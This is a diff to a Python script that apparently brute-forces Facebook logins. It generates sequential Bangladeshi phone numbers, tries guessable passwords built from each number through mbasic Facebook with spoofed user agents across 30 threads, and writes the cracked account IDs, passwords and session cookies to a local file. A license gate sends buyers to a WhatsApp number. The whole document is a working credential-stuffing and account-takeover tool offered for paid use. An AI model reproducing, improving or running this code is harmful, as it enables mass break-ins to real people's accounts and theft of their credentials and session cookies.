@@ -46,7 +46,8 @@ class sort:
 
 def info():
     sort.clear()
-    print('     [b]    [red1] WELCOME TO MY TOOL          ')
+    print('[b][red1]WELCOME TO MY TOOL          ')
+    time.sleep(3)
     if not os.path.exists('device_info.txt'):
         os.system('clear')
         print(sort.logo())
@@ -449,7 +450,7 @@ def ran():
     else:
         print(" [b]    [red1]✗ [chartreuse1]Selected  [orange3]▶  [chartreuse1]BD Number")
         print(sort.line())
-        print("[b]     [red1]✗ [chartreuse1]Type A 4 Digit Sim Code EX   [orange3]▶  [chartreuse1]0171, 0185, 0192")
+        print("[b]     [red1]✗ [chartreuse1]Type A BD Number EX   [orange3]▶  [chartreuse1]01718702440")
         code = str(input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m "))
         print(sort.line())
         print("[b]     [red1]✗ [chartreuse1]How Many Do You Want To Clone EX   [orange3]▶  [chartreuse1]100000, 200000")
@@ -457,7 +458,7 @@ def ran():
         print(sort.line())
 
         for i in range(limit):
-            data = str(random.choice(range(1000000, 9999999)))
+            data = str(int(code) + i)
             user.append(data)
     print(" Method 1(Best)")
     print(" Method 2")
@@ -480,7 +481,7 @@ def ran():
     else:
         fb = "mbasic"
 
-    with ThreadPool(max_workers=20) as heron:
+    with ThreadPool(max_workers=30) as heron:
         sort.clear()
         sort.logo()
         print(" [b]    [red1]✗ [chartreuse1]Total Uid [orange3]▶  [chartreuse1]" + str(len(user)))
@@ -490,13 +491,12 @@ def ran():
             if ask in ["1", "01", "a", "A"]:
                 uid = "91" + xd
             else:
-                uid = code + xd
+                uid = "0" + xd
             if ask in ["1", "01", "a", "A"]:
                 pwx = ["57575751", "57575752", "57273200", "59039200", "07860786", uid, xd, xd[2:]]
             else:
-                pwx = [uid, uid[:6], uid[:8], xd[1:],
-                       uid[3:]]  # , "bangladesh", "@#@#@#", "@#@#@#@#", "@@@###", "@@@@####", "১২৩৪৫৬"]
-
+                pwx = [uid, uid[:6], uid[:8], xd[4:],
+                       xd[2:]]  # , "bangladesh", "@#@#@#", "@#@#@#@#", "@@@###", "@@@@####", "১২৩৪৫৬"]
             heron.submit(ren_sub, uid, pwx, meth, user, fb)
 
 
@@ -506,7 +506,7 @@ def ren_sub(uid, pwx, meth, user, fb):
     custom_agent = ""
     session = requests.Session()
     sys.stdout.write(
-        f"\r  \x1b[38;1;155m\x1b[38;5;155m[PRINCE-M{meth}]   {loop} • \x1b[38;5;155m{str(len(user))}  • {str(len(oks))}"),
+        f"\r  \x1b[38;1;155m\x1b[38;5;155m[PRINCE-M{meth}]   {loop} • \x1b[38;5;155m{str(len(user))}  • {str(len(oks))}\r\r"),
     sys.stdout.flush()
     try:
         for ps in pwx:
@@ -516,7 +516,7 @@ def ren_sub(uid, pwx, meth, user, fb):
                     "m_ts": re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
                     "li": re.search('name="li" value="(.*?)"', str(free_fb)).group(1), "try_number": "0",
                     "unrecognized_tries": "0", "email": uid, "pass": ps, "login": "Log In"}
-            uax = Vivo()
+            uax = Samsung()
             ver1 = str(random.randrange(1, 99))
             ver2 = str(random.randrange(90, 121))
             lsd = lsb()
@@ -558,7 +558,7 @@ def ren_sub(uid, pwx, meth, user, fb):
                 xd = xx[:15]
                 res = requests.get(f"https://graph2.facebook.com/v3.3/{xd}/picture?redirect=0").json()
                 if "height" in res["data"]:
-                    print(f"\r\r[PRINCE-OK] {xd} • {ps}\n[Cookies]{coki}\n")
+                    print(f"\r\r[PRINCE-OK] {xd} • {ps}\n[Cookies]{coki}")
                     open("/sdcard/SD-OK.txt", "a").write(uid + "|" + ps + "|" + coki + "\n")
                     oks.append(xd)
                     break
@@ -567,9 +567,10 @@ def ren_sub(uid, pwx, meth, user, fb):
 
 
             elif "checkpoint" in heron_brand:
-                pass
+                # coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 
-                # print(f"\r\r[green] [CP-ID] {uid} | {ps}")
+                # print(f"\r\r[green] [OK-ID] {uid} | {ps} \n [🤫]{coki}")
+                pass
             else:
                 continue
         loop += 1
@@ -682,14 +683,14 @@ def approve():
     if showkey in datax:
         sort.clear()
         print("Checking Subscription")
-        time.sleep(5)
+        time.sleep(3)
         main()
     else:
         sort.logo()
 
         print("your Key ->   " + showkey)
         input("This is paid tool bro. If you want to buy press enter. ")
-        tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20' + showkey)
+        tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20' + showkey);
         os.system('am start https://wa.me/+8801617687239?text=' + tks)
         sys.exit()
 
